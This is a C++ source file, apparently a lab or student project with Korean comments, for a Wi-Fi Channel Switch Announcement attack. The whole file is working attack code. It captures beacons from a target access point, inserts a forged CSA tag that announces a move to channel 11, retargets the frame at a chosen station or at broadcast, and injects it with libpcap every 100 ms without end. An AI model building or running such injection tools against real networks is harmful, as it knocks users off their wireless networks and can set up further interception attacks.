#include <cstdio>
#include <cstring>
#include <unistd.h>
#include <vector>
#include <pcap.h>
#include "param.h"
#include "dot11.h"
#include "radiotap.h"

void attackLoop(pcap_t* handle) {
    Mac station;
    if (args_.hasStation)
        station = args_.staMac;
    else
        station = Mac("ff:ff:ff:ff:ff:ff");

    int count = 0;
    while (true) {
        struct pcap_pkthdr* header;
        const uint8_t* pkt;

        int res = pcap_next_ex(handle, &header, &pkt);
        if (res == 0) continue;
        if (res < 0) break;

        // radiotap 길이
        uint16_t rtLen;
        memcpy(&rtLen, pkt + 2, sizeof(rtLen));

        int minLen = rtLen + (int)sizeof(Dot11Hdr) + (int)sizeof(BeaconHdr::Fix);
        if ((int)header->caplen < minLen) continue;

        // beacon 확인
        Dot11Hdr dot11;
        memcpy(&dot11, pkt + rtLen, sizeof(Dot11Hdr));
        if (!dot11.isBeacon()) continue;
        if (!(dot11.addr2_ == args_.apMac)) continue;

        // FCS 크기
        RadioTapHdr rtHdr;
        memcpy(&rtHdr, pkt, sizeof(RadioTapHdr));
        size_t fcsSize = rtHdr.get_fcs();

        // tagged params 범위
        int tagStart = rtLen + (int)sizeof(Dot11Hdr) + (int)sizeof(BeaconHdr::Fix);
        int tagEnd = (int)header->caplen - (int)fcsSize;

        // CSA 태그 준비
        BeaconHdr::CsaTag csa;
        csa.number = 0x25;
        csa.length = 0x03;
        csa.channelSwitchMode = 0x01;
        csa.newChannel = 0x0B;
        csa.channelSwitchCount = 0x03;

        // tag 순회하며 CSA 삽입 (tag number 정렬 유지)
        std::vector<uint8_t> newTags;
        bool csaInserted = false;
        int pos = tagStart;

        while (pos + 2 <= tagEnd) {
            uint8_t tagNum = pkt[pos];
            uint8_t tagLen = pkt[pos + 1];

            if (tagNum == 0x25) {
                // 기존 CSA 있으면 교체
                newTags.insert(newTags.end(), (uint8_t*)&csa, (uint8_t*)&csa + sizeof(csa));
                csaInserted = true;
                pos += 2 + tagLen;
                continue;
            }
            if (!csaInserted && tagNum > 0x25) {
                // 정렬 위치에 삽입
                newTags.insert(newTags.end(), (uint8_t*)&csa, (uint8_t*)&csa + sizeof(csa));
                csaInserted = true;
            }
            if (pos + 2 + tagLen > tagEnd) break;
            newTags.insert(newTags.end(), pkt + pos, pkt + pos + 2 + tagLen);
            pos += 2 + tagLen;
        }

        if (!csaInserted) {
            newTags.insert(newTags.end(), (uint8_t*)&csa, (uint8_t*)&csa + sizeof(csa));
        }

        // 새 패킷 조립: [Radiotap][Dot11Hdr+Fix][수정된 Tags]
        std::vector<uint8_t> newPacket;
        newPacket.insert(newPacket.end(), pkt, pkt + tagStart);
        newPacket.insert(newPacket.end(), newTags.begin(), newTags.end());

        // addr1 교체
        int addr1Offset = rtLen + 4;
        memcpy(newPacket.data() + addr1Offset, station.mac_, 6);

        if (pcap_inject(handle, newPacket.data(), newPacket.size()) < 0)
            fprintf(stderr, "inject error: %s\n", pcap_geterr(handle));

        count++;
        printf("\rSent %d CSA beacon", count);
        fflush(stdout);
        usleep(100000);
    }
}

int main(int argc, char* argv[]) {
    if (!parseArgs(argc, argv)) {
        usage(argv[0]);
        return 1;
    }

    pcap_t* handle = openHandle(args_.iface);
    if (!handle) return 1;

    printInfo();
    attackLoop(handle);

    pcap_close(handle);
    return 0;
}